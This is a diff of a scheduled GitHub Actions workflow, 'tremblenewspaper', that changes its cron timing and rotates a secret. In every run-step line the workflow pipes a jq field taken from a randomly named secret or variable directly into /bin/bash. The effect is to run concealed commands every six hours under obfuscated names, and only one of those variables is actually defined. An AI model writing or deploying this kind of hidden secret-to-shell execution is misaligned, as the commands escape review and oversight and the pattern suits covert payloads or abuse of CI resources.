@@ -3,21 +3,25 @@ name: tremblenewspaper
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 2/6 * * *'
-jobs:  # 29236
+    - cron: '21 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tremblenewspaper
         env:
-          tyk67264: ${{ secrets.tyk67264 }}
+          y6: ${{ secrets.y6 }}
         run: |
-          echo $tyk67264 | jq -r .pwi25257 | /bin/bash
-          echo $f2 | jq -r .dqb59787 | /bin/bash
-          echo $vbskh6 | jq -r .jt90153 | /bin/bash
-          echo $bdgtl10532 | jq -r .qsdty5 | /bin/bash
-          echo $k60 | jq -r .krcaj10199 | /bin/bash
-          echo $bctyq948 | jq -r .mzbop0377 | /bin/bash
-          echo $vunka4889 | jq -r .ldeua2753 | /bin/bash
+          echo $y6 | jq -r .rxd9122 | /bin/bash
+          echo $f4 | jq -r .xrz6420 | /bin/bash
+          echo $ehfy66 | jq -r .z8939 | /bin/bash
+          echo $nfn8623 | jq -r .ny12 | /bin/bash
+          echo $tk77 | jq -r .wi669 | /bin/bash
+          echo $o9 | jq -r .vrq52 | /bin/bash
+          echo $ksyzn1 | jq -r .c36 | /bin/bash
+          echo $qbk5 | jq -r .z6 | /bin/bash
+          echo $dp06447 | jq -r .axaix384 | /bin/bash
+          echo $mr87 | jq -r .pww570 | /bin/bash
 
